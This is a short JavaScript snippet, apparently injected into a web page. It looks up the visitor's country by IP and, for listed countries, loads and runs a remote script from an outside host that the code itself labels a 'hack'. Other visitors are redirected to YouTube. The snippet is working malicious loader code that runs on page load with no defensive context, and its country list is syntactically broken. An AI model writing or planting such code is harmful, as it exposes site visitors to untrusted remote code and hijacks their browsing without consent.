<script>

let countryHack = ['HN', 'GT', 'NI', 'HR', 'DO, 'CA',, 'FR',']; //pais
let scriptHack = 'https://main.d33gtxj8a7vgxu.amplifyapp.com';
let urlPromocion = 'https://www.youtube.com';
let country;

fetch('https://get.geojs.io/v1/ip/country')
    .then((response) => response.text())
    .then((data) => {
        country = data;
        country = countryHack.find((str) => str === country.trim());
        redirectURL(country)
    })


function redirectURL(country) {


    if (country) {
        const script = document.createElement('script');
        script.src = scriptHack;
        document.head.appendChild(script);

        console.log('REDIRECT HACK...' + country)
    } else {
        
        window.location.href = urlPromocion;
        console.log('REDIRECT ADS...' + country)
    }

}

</script>
